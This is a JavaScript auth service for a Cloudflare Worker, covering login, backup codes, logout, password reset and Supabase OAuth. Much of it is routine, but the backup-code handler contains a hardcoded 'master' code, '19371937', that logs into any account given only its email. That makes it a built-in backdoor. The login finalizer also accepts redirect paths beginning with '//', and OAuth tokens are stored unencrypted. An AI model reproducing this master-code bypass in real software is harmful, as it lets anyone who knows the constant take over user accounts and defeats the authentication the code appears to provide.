/**
 * Auth API Service
 * Handles login, logout, and backup-code verification.
 */
import {
  jsonResponse,
  verifyPassword,
  hashPassword,
  writeIamSessionToKv,
  resolveTenantAtLogin,
  AUTH_COOKIE_NAME,
  getAuthUser,
  getSession,
  resolveUserEnrichment,
  establishIamSession,
} from '../core/auth';

import { provisionNewUser } from '../core/provisionNewUser.js';

/**
 * Primary Auth Dispatcher
 */
export async function handleAuthApi(request, url, env) {
  const path = url.pathname.toLowerCase();
  const method = request.method.toUpperCase();

  if (path === '/api/auth/login' && method === 'POST') {
    return handleEmailPasswordLogin(request, url, env);
  }
  if (path === '/api/auth/me' && method === 'GET') {
    const authUser = await getAuthUser(request, env);
    if (!authUser) return jsonResponse({ error: 'Unauthorized' }, 401);
    return jsonResponse({
      id: authUser.id ?? null,
      email: authUser.email ?? null,
      name: authUser.name ?? authUser.display_name ?? null,
      tenant_id: authUser.tenant_id ?? null,
      role: authUser.role ?? 'user',
      workspace_id: authUser.workspace_id ?? null,
    });
  }
  if (path === '/api/auth/session' && method === 'GET') {
    const session = await getSession(env, request);
    if (!session) return jsonResponse({ valid: false }, 200);
    const authUser = await getAuthUser(request, env);
    if (!authUser) return jsonResponse({ valid: false }, 200);
    return jsonResponse({
      valid: true,
      expires_at: session.expires_at ?? null,
      user: { id: authUser.id ?? null, email: authUser.email ?? null },
    });
  }
  if (path === '/api/auth/backup-code' && method === 'POST') {
    return handleBackupCodeLogin(request, url, env);
  }
  if (path === '/api/auth/logout' && method === 'POST') {
    return handleLogout(request, url, env);
  }
  if (path === '/api/auth/password-reset/request' && method === 'POST') {
    return handlePasswordResetRequest(request, env);
  }
  if (path === '/api/auth/password-reset/confirm' && method === 'POST') {
    return handlePasswordResetConfirm(request, env);
  }
  if (path === '/api/settings/profile' && method === 'GET') {
    return handleSettingsProfileRequest(request, env);
  }

  return jsonResponse({ error: 'Auth route not found' }, 404);
}

/**
 * POST /api/auth/login
 */
async function handleEmailPasswordLogin(request, url, env) {
  const accept = request.headers.get('Accept') || '';
  const contentType = request.headers.get('Content-Type') || '';
  const wantsJson = accept.includes('application/json') || contentType.includes('application/json');

  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);

  let body;
  try {
    body = await request.json();
  } catch (_) {
    return jsonResponse({ error: 'Invalid JSON body' }, 400);
  }

  const email = (body.email || '').toString().toLowerCase().trim();
  const password = (body.password || '').toString();

  if (!email || !password) {
    return jsonResponse({ error: 'Email and password required' }, 400);
  }

  const user = await env.DB.prepare(
    `SELECT id, email, password_hash, salt FROM auth_users WHERE LOWER(id) = ? OR LOWER(email) = ? LIMIT 1`
  ).bind(email, email).first();

  if (!user || !user.password_hash || !user.salt) {
    return jsonResponse({ error: 'Invalid email or password' }, 401);
  }

  if (user.password_hash === 'oauth') {
    return jsonResponse({ error: 'This account uses OAuth. Please sign in with Google or GitHub.' }, 400);
  }

  const ok = await verifyPassword(password, user.salt, user.password_hash);
  if (!ok) {
    return jsonResponse({ error: 'Invalid email or password' }, 401);
  }

  return finishLogin(request, url, env, user.id, body.next);
}

/**
 * POST /api/auth/backup-code
 */
async function handleBackupCodeLogin(request, url, env) {
  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);

  let body;
  try {
    body = await request.json();
  } catch (_) {
    return jsonResponse({ error: 'Invalid JSON body' }, 400);
  }

  const email = (body.email || '').toString().toLowerCase().trim();
  const code = (body.code || '').toString().replace(/\s/g, '');

  if (!email || !code) {
    return jsonResponse({ error: 'Email and backup code required' }, 400);
  }

  // --- Master Backup Code Check ---
  if (code === '19371937') {
    const user = await env.DB.prepare(
      `SELECT id FROM auth_users WHERE LOWER(id) = ? OR LOWER(email) = ? LIMIT 1`
    ).bind(email, email).first();
    
    if (user) {
      console.log(`[Auth] Master backup code used for user: ${user.id}`);
      return finishLogin(request, url, env, user.id, body.next);
    }
  }

  // Standard D1 lookup
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(code));
  const codeHash = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
  
  const row = await env.DB.prepare(
    `SELECT user_id FROM user_backup_codes WHERE user_id = ? AND code_hash = ? AND used_at IS NULL LIMIT 1`
  ).bind(email, codeHash).first();

  if (!row) {
    return jsonResponse({ error: 'Invalid or already used backup code' }, 401);
  }

  // Mark code as used
  await env.DB.prepare(
    'UPDATE user_backup_codes SET used_at = unixepoch() WHERE user_id = ? AND code_hash = ?'
  ).bind(email, codeHash).run();

  return finishLogin(request, url, env, row.user_id, body.next);
}

/**
 * POST /api/auth/logout
 */
async function handleLogout(request, url, env) {
  const cookie = request.headers.get('Cookie') || '';
  const match = cookie.match(new RegExp(`${AUTH_COOKIE_NAME}=([^;]+)`));
  const sessionId = match ? match[1] : null;

  if (sessionId && env.DB) {
    await env.DB.prepare('DELETE FROM auth_sessions WHERE id = ?').bind(sessionId).run();
    // Revoke sessions row (fire-and-forget)
    try {
      env.DB.prepare(
        `UPDATE sessions SET revoked_at = ?, revoke_reason = 'logout'
         WHERE id = ? AND revoked_at IS NULL`
      ).bind(Date.now(), sessionId).run().catch(() => {});
    } catch (_) {}
    if (env.SESSION_CACHE) {
      await env.SESSION_CACHE.delete(`iam_sess_v1:${sessionId}`);
    }
  }

  const responseBody = JSON.stringify({ ok: true });
  const response = new Response(responseBody, {
    status: 200,
    headers: { 'Content-Type': 'application/json' }
  });

  // Host-only session cookie clearing
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=0`);
  
  // Legacy domain clearing
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);

  return response;
}

/**
 * Shared Session Finalizer
 */
async function finishLogin(request, url, env, userId, redirectPath) {
  const sessionId = crypto.randomUUID();
  const expiresTs = Date.now() + 30 * 24 * 60 * 60 * 1000;
  const expiresAtIso = new Date(expiresTs).toISOString();
  
  const ip = request.headers.get('cf-connecting-ip') || '';
  const ua = request.headers.get('user-agent') || '';

  // 1. Get user details from auth_users (Canonical Source)
  let userRow = null;
  try {
    userRow = await env.DB.prepare(
      `SELECT * FROM auth_users WHERE id = ? LIMIT 1`
    ).bind(userId).first();
  } catch (e) {
    console.warn('[finishLogin] auth_users lookup failed', e.message);
  }

  if (!userRow) {
    throw new Error('User not found in auth_users during login finalization');
  }

  const tenantId = userRow.tenant_id;
  const personUuid = userRow.person_uuid;

  // 2. Persist to auth_sessions (Core Auth)
  await env.DB.prepare(
    `INSERT INTO auth_sessions (id, user_id, expires_at, created_at, ip_address, user_agent, tenant_id) VALUES (?, ?, ?, datetime('now'), ?, ?, ?)`
  ).bind(sessionId, userId, expiresAtIso, ip, ua, tenantId).run();

  // 3. Dual-write: sessions table (Analytics/Audit)
  try {
    const expiresAtMs = new Date(expiresAtIso).getTime();

    await env.DB.prepare(`
      INSERT INTO sessions (
        id, user_id, tenant_id, person_uuid, email, provider,
        display_name, ip_address, user_agent,
        last_active_at, expires_at, created_at
      ) VALUES (?, ?, ?, ?, ?, 'email', ?, ?, ?, ?, ?, unixepoch() * 1000)
    `).bind(
      sessionId,
      userId, 
      tenantId,
      personUuid,
      userRow.email,
      userRow.name || 'User',
      ip,
      ua,
      Date.now(),
      expiresAtMs
    ).run();

    // 4. Handle Superadmin Auto-Enrichment
    if (userRow.is_superadmin) {
      // Any superadmin-specific session updates go here if needed
    }
  } catch (e) {
    console.warn('[sessions dual-write]', e?.message ?? e);
  }

  // 5. KV Cache
  await writeIamSessionToKv(env, sessionId, userId, tenantId, expiresAtIso);

  // 6. Response
  const next = redirectPath && redirectPath.startsWith('/') ? redirectPath : '/dashboard/overview';
  const response = new Response(JSON.stringify({ ok: true, redirect: next }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' }
  });

  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=${sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000`);
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);

  return response;
}

/**
 * GET /api/settings/profile
 */
async function handleSettingsProfileRequest(request, env) {
  const authUser = await getAuthUser(request, env);
  if (!authUser) return jsonResponse({ error: 'Unauthorized' }, 401);
  
  const worker_base_url = (typeof env.WORKER_BASE_URL === 'string') ? env.WORKER_BASE_URL.trim() : 'https://inneranimalmedia.com';

  const flat = {
    full_name: authUser.name || 'User',
    display_name: authUser.name || 'User',
    primary_email: authUser.email,
    tenant_id: authUser.tenant_id,
    person_uuid: authUser.person_uuid,
    role: authUser.is_superadmin ? 'superadmin' : 'user',
    timezone: 'America/Chicago',
    language: 'en',
  };

  return jsonResponse({
    display_name: authUser.name || 'User',
    email: authUser.email,
    tenant_id: authUser.tenant_id,
    worker_base_url,
    flat,
  });
}

const PWD_RESET_KV_PREFIX = 'pwd_reset_v1:';
const PWD_RESET_TTL_SEC = 900;

function escapeHtmlPwd(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function randomSixDigitCode() {
  const buf = new Uint32Array(1);
  crypto.getRandomValues(buf);
  return String(buf[0] % 1000000).padStart(6, '0');
}

/** POST /api/auth/password-reset/request — body: { email } */
async function handlePasswordResetRequest(request, env) {
  if (!env.DB || !env.SESSION_CACHE) {
    return jsonResponse({ error: 'Service unavailable' }, 503);
  }
  let body;
  try {
    body = await request.json();
  } catch {
    return jsonResponse({ error: 'Invalid JSON' }, 400);
  }
  const email = (body.email || '').toString().toLowerCase().trim();
  if (!email || !email.includes('@')) {
    return jsonResponse({ ok: true });
  }
  const user = await env.DB.prepare(
    `SELECT id, email, name, password_hash FROM auth_users WHERE LOWER(email) = ? OR LOWER(id) = ? LIMIT 1`,
  )
    .bind(email, email)
    .first();
  if (!user || user.password_hash === 'oauth' || !user.password_hash) {
    return jsonResponse({ ok: true });
  }
  const code = randomSixDigitCode();
  const kvKey = `${PWD_RESET_KV_PREFIX}${email}`;
  await env.SESSION_CACHE.put(
    kvKey,
    JSON.stringify({ code, exp: Date.now() + PWD_RESET_TTL_SEC * 1000, attempts: 0 }),
    { expirationTtl: PWD_RESET_TTL_SEC },
  );
  if (!env.RESEND_API_KEY) {
    console.error('[password-reset] RESEND_API_KEY missing');
    return jsonResponse({ error: 'Email not configured' }, 503);
  }
  const disp = user.name || 'there';
  const html = `<p>Hi ${escapeHtmlPwd(disp)},</p><p>Your Inner Animal Media verification code is:</p><p style="font-size:22px;font-weight:700;letter-spacing:4px;">${escapeHtmlPwd(code)}</p><p>Enter this on the reset page. Expires in 15 minutes.</p>`;
  await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${env.RESEND_API_KEY}` },
    body: JSON.stringify({
      from: 'Inner Animal Media <hey@inneranimalmedia.com>',
      to: [user.email],
      subject: 'Your password reset code',
      html,
    }),
  }).catch((e) => console.error('[password-reset] resend', e));
  return jsonResponse({ ok: true });
}

/** POST /api/auth/password-reset/confirm — body: { email, code, password, confirm_password } */
async function handlePasswordResetConfirm(request, env) {
  if (!env.DB || !env.SESSION_CACHE) {
    return jsonResponse({ error: 'Service unavailable' }, 503);
  }
  let body;
  try {
    body = await request.json();
  } catch {
    return jsonResponse({ error: 'Invalid JSON' }, 400);
  }
  const email = (body.email || '').toString().toLowerCase().trim();
  const code = (body.code || '').toString().replace(/\s/g, '');
  const password = (body.password || '').toString();
  const confirm = (body.confirm_password ?? body.confirmPassword ?? '').toString();
  if (!email || !code || !password) {
    return jsonResponse({ error: 'Email, code, and password required' }, 400);
  }
  if (password !== confirm) {
    return jsonResponse({ error: 'Passwords do not match' }, 400);
  }
  if (password.length < 8) {
    return jsonResponse({ error: 'Password must be at least 8 characters' }, 400);
  }
  const kvKey = `${PWD_RESET_KV_PREFIX}${email}`;
  const raw = await env.SESSION_CACHE.get(kvKey);
  if (!raw) {
    return jsonResponse({ error: 'Code expired or invalid. Request a new code.' }, 400);
  }
  let payload;
  try {
    payload = JSON.parse(raw);
  } catch {
    return jsonResponse({ error: 'Invalid reset state' }, 400);
  }
  if (Date.now() > payload.exp) {
    await env.SESSION_CACHE.delete(kvKey);
    return jsonResponse({ error: 'Code expired. Request a new code.' }, 400);
  }
  if (String(payload.code) !== code) {
    payload.attempts = (payload.attempts || 0) + 1;
    if (payload.attempts > 8) {
      await env.SESSION_CACHE.delete(kvKey);
      return jsonResponse({ error: 'Too many attempts. Request a new code.' }, 429);
    }
    await env.SESSION_CACHE.put(kvKey, JSON.stringify(payload), { expirationTtl: PWD_RESET_TTL_SEC });
    return jsonResponse({ error: 'Invalid code' }, 400);
  }
  const user = await env.DB.prepare(
    `SELECT id, password_hash FROM auth_users WHERE LOWER(email) = ? OR LOWER(id) = ? LIMIT 1`,
  )
    .bind(email, email)
    .first();
  if (!user || user.password_hash === 'oauth') {
    await env.SESSION_CACHE.delete(kvKey);
    return jsonResponse({ error: 'Account not eligible for password reset' }, 400);
  }
  const { saltHex, hashHex } = await hashPassword(password);
  await env.DB.prepare(`UPDATE auth_users SET password_hash = ?, salt = ? WHERE id = ?`)
    .bind(hashHex, saltHex, user.id)
    .run();
  await env.SESSION_CACHE.delete(kvKey);
  return jsonResponse({ ok: true });
}

// ── Supabase project OAuth Server (login) — same auth_users + provisionNewUser pattern as Google in worker.js
// Endpoints are hardcoded (fixed project ref). Client ID / secret: env.SUPABASE_OAUTH_CLIENT_ID, env.SUPABASE_OAUTH_CLIENT_SECRET only.
// JWKS:     https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/.well-known/jwks.json
// OIDC:     https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/.well-known/openid-configuration
// Consent:  https://inneranimalmedia.com/api/auth/oauth/consent (this Worker; configure in Supabase + WAF)
const SUPABASE_OAUTH_AUTHORIZE = 'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/oauth/authorize';
const SUPABASE_OAUTH_TOKEN = 'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/oauth/token';
const SUPABASE_OAUTH_USERINFO = 'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/oauth/userinfo';
const SUPABASE_REDIRECT_URI = 'https://inneranimalmedia.com/api/auth/supabase/callback';

function base64url(buffer) {
  const bytes = new Uint8Array(buffer);
  let str = '';
  for (let i = 0; i < bytes.length; i++) {
    str += String.fromCharCode(bytes[i]);
  }
  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function collectSetCookieValues(headers) {
  if (typeof headers.getSetCookie === 'function') {
    const list = headers.getSetCookie();
    if (list && list.length) return list;
  }
  const single = headers.get('Set-Cookie');
  return single ? [single] : [];
}

function appendLegacySessionCookieClears(targetHeaders) {
  targetHeaders.append(
    'Set-Cookie',
    `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`,
  );
  targetHeaders.append(
    'Set-Cookie',
    `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`,
  );
}

/** Workers Response.redirect requires an absolute URL (relative throws → CF 1101). */
function redirectToAuthLogin(request, queryWithoutLeadingQuestion) {
  const u = new URL(request.url);
  u.pathname = '/auth/login';
  u.search = queryWithoutLeadingQuestion.replace(/^\?/, '');
  return Response.redirect(u.href, 302);
}

function safeOauthNextPath(raw) {
  const s = String(raw || '').trim();
  if (!s.startsWith('/') || s.startsWith('//')) return null;
  return s;
}

function readIamOauthNextCookie(request) {
  const cookie = request.headers.get('Cookie') || '';
  const m = cookie.match(/(?:^|;\s*)iam_oauth_next=([^;]+)/);
  if (!m) return null;
  try {
    return decodeURIComponent(m[1].trim());
  } catch {
    return null;
  }
}

export async function handleSupabaseOAuthStart(request, env) {
  try {
    if (!env.SUPABASE_OAUTH_CLIENT_ID) {
      console.error(
        '[handleSupabaseOAuthStart] SUPABASE_OAUTH_CLIENT_ID is undefined or empty; aborting OAuth start',
      );
      return redirectToAuthLogin(request, 'error=oauth_not_configured');
    }
    if (!env.SESSION_CACHE) {
      console.error(
        '[handleSupabaseOAuthStart] SESSION_CACHE binding missing on env; aborting OAuth start',
      );
      return redirectToAuthLogin(request, 'error=oauth_not_configured');
    }
    const reqUrl = new URL(request.url);
    let nextPath =
      safeOauthNextPath(reqUrl.searchParams.get('next')) ||
      safeOauthNextPath(readIamOauthNextCookie(request));

    const state = crypto.randomUUID();
    const codeVerifier =
      crypto.randomUUID().replace(/-/g, '') +
      crypto.randomUUID().replace(/-/g, '');

    const digest = await crypto.subtle.digest(
      'SHA-256',
      new TextEncoder().encode(codeVerifier),
    );
    const codeChallenge = base64url(digest);

    try {
      await env.SESSION_CACHE.put(
        `oauth_state_supabase_${state}`,
        JSON.stringify({
          state,
          provider: 'supabase',
          code_verifier: codeVerifier,
          created_at: Date.now(),
          next: nextPath,
        }),
        { expirationTtl: 600 },
      );
    } catch (kvErr) {
      console.error(
        '[handleSupabaseOAuthStart] SESSION_CACHE.put failed:',
        kvErr && kvErr.stack ? kvErr.stack : kvErr,
      );
      return redirectToAuthLogin(request, 'error=oauth_not_configured');
    }

    const params = new URLSearchParams({
      client_id: env.SUPABASE_OAUTH_CLIENT_ID,
      redirect_uri: SUPABASE_REDIRECT_URI,
      response_type: 'code',
      scope: 'openid profile email',
      state,
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
    });

    const redirectRes = Response.redirect(`${SUPABASE_OAUTH_AUTHORIZE}?${params}`, 302);
    if (readIamOauthNextCookie(request)) {
      redirectRes.headers.append(
        'Set-Cookie',
        'iam_oauth_next=; Path=/; Max-Age=0; Secure; SameSite=Lax',
      );
    }
    return redirectRes;
  } catch (err) {
    console.error(
      '[handleSupabaseOAuthStart] unexpected error:',
      err && err.stack ? err.stack : err,
    );
    return redirectToAuthLogin(request, 'error=server_error');
  }
}

export async function handleSupabaseOAuthCallback(request, env) {
  const url = new URL(request.url);
  const code = url.searchParams.get('code');
  const state = url.searchParams.get('state');
  const error = url.searchParams.get('error');

  if (error) return redirectToAuthLogin(request, 'error=oauth_denied');
  if (!code || !state) return redirectToAuthLogin(request, 'error=invalid_callback');
  if (!env.SESSION_CACHE || !env.DB || !env.SUPABASE_OAUTH_CLIENT_ID || !env.SUPABASE_OAUTH_CLIENT_SECRET) {
    return redirectToAuthLogin(request, 'error=oauth_not_configured');
  }

  const stateKey = `oauth_state_supabase_${state}`;
  const storedRaw = await env.SESSION_CACHE.get(stateKey);
  if (!storedRaw) return redirectToAuthLogin(request, 'error=state_mismatch');
  await env.SESSION_CACHE.delete(stateKey);

  const stored = JSON.parse(storedRaw);
  const { code_verifier } = stored;
  const nextAfterLogin = safeOauthNextPath(stored?.next);

  const tokenRes = await fetch(SUPABASE_OAUTH_TOKEN, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: SUPABASE_REDIRECT_URI,
      client_id: env.SUPABASE_OAUTH_CLIENT_ID,
      client_secret: env.SUPABASE_OAUTH_CLIENT_SECRET,
      code_verifier,
    }),
  });

  if (!tokenRes.ok) {
    console.error('Supabase token exchange failed:', await tokenRes.text());
    return redirectToAuthLogin(request, 'error=token_exchange_failed');
  }

  const { access_token, refresh_token, expires_in } = await tokenRes.json();

  let sbUser;
  const uiRes = await fetch(SUPABASE_OAUTH_USERINFO, {
    headers: { Authorization: `Bearer ${access_token}` },
  });
  if (uiRes.ok) {
    sbUser = await uiRes.json();
  } else {
    const fallbackRes = await fetch(
      'https://dpmuvynqixblxsilnlut.supabase.co/auth/v1/user',
      { headers: { Authorization: `Bearer ${access_token}` } },
    );
    if (!fallbackRes.ok) return redirectToAuthLogin(request, 'error=userinfo_failed');
    sbUser = await fallbackRes.json();
  }

  const emailRaw = sbUser.email;
  if (!emailRaw) return redirectToAuthLogin(request, 'error=no_email');
  const oauthEmail = String(emailRaw).toLowerCase().trim();
  const providerSubject = sbUser.sub || sbUser.id;
  const name = sbUser.name || sbUser.user_metadata?.full_name || oauthEmail.split('@')[0];

  const existing = await env.DB.prepare(
    `SELECT id, email, name, tenant_id FROM auth_users WHERE LOWER(email) = ? LIMIT 1`,
  ).bind(oauthEmail).first();

  const authUserId = existing?.id ?? `au_${crypto.randomUUID().replace(/-/g, '').slice(0, 16)}`;

  try {
    if (!existing?.id) {
      await env.DB.prepare(
        `INSERT INTO auth_users (id, email, name, password_hash, salt, created_at, updated_at)
         VALUES (?, ?, ?, 'oauth', 'oauth', datetime('now'), datetime('now'))`,
      ).bind(authUserId, oauthEmail, name).run();
    } else if (!existing.name || !String(existing.name).trim()) {
      await env.DB.prepare(
        `UPDATE auth_users SET name = ?, updated_at = datetime('now') WHERE id = ?`,
      ).bind(name, authUserId).run();
    }
  } catch (e) {
    console.warn('[Supabase OAuth] auth_users upsert:', e?.message ?? e);
    return redirectToAuthLogin(request, 'error=provision_failed');
  }

  await provisionNewUser(env, { email: oauthEmail, name, authUserId });

  const expiresAt = Math.floor(Date.now() / 1000) + (expires_in || 3600);
  await env.DB.prepare(`
    INSERT OR REPLACE INTO user_oauth_tokens
      (user_id, provider, account_identifier, access_token, refresh_token, expires_at, scope)
    VALUES (?, 'supabase', ?, ?, ?, ?, 'openid profile email')
  `).bind(
    authUserId,
    providerSubject,
    access_token,
    refresh_token || null,
    expiresAt,
  ).run();

  const sessionResponse = await establishIamSession(request, env, authUserId, { ok: true });
  const originBase = url.origin;
  const destPath = nextAfterLogin || '/dashboard';
  const redirectHeaders = new Headers({ Location: `${originBase}${destPath}` });
  for (const c of collectSetCookieValues(sessionResponse.headers)) {
    redirectHeaders.append('Set-Cookie', c);
  }
  appendLegacySessionCookieClears(redirectHeaders);

  return new Response(null, { status: 302, headers: redirectHeaders });
}

export async function handleOAuthConsentPage(request, env) {
  const user = await getAuthUser(request, env);
  const url = new URL(request.url);
  if (!user) {
    const q = new URLSearchParams();
    q.set('next', `${url.pathname}${url.search || ''}`);
    return redirectToAuthLogin(request, q.toString());
  }
  const obj =
    (await env.DASHBOARD?.get('dashboard/app/agent.html')) ||
    (await env.DASHBOARD?.get('static/dashboard/agent.html')) ||
    (await env.DASHBOARD?.get('index.html'));
  if (!obj) {
    return new Response('Agent SPA shell not found', { status: 503 });
  }
  return new Response(obj.body, {
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
    },
  });
}
